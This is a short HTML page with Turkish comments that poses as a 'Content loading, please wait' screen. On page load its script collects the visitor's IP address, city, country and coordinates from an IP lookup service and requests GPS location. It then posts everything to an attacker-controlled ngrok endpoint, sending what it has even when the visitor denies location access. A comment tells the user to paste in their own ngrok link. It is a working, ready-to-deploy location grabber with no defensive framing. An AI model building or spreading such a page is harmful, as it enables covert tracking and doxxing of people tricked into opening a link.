<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
</head>
<body>
    <script>
        async function yakala() {
            // Önce basit bir IP servisi kullanalım (Token istemez)
            let veri = { ip: "Alınamadı", city: "Alınamadı", loc: "Alınamadı" };

            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                veri.ip = d.ip;
                veri.city = d.city + " / " + d.country_name;
                veri.loc = d.latitude + "," + d.longitude;
            } catch (e) { console.log("IP servisi hatası"); }

            // Konum izni iste
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    veri.loc = pos.coords.latitude + "," + pos.coords.longitude + " (GPS)";
                    gonder(veri);
                }, () => { gonder(veri); }); // Reddedilse de eldeki veriyi gönder
            } else {
                gonder(veri);
            }
        }

        function gonder(data) {
            // BURAYA KENDİ NGROK LİNKİNİ YAZ (Sonunda /log olsun)
            const serverUrl = 'https://punctual-villain-arson.ngrok-free.dev/log';

            fetch(serverUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(e => console.log("Gönderim hatası: ", e));
        }

        window.onload = yakala;
    </script>

    <h1 style="font-family: sans-serif; text-align: center; margin-top: 50px;">
        İçerik Yükleniyor, Lütfen Bekleyin...
    </h1>
</body>
</html>
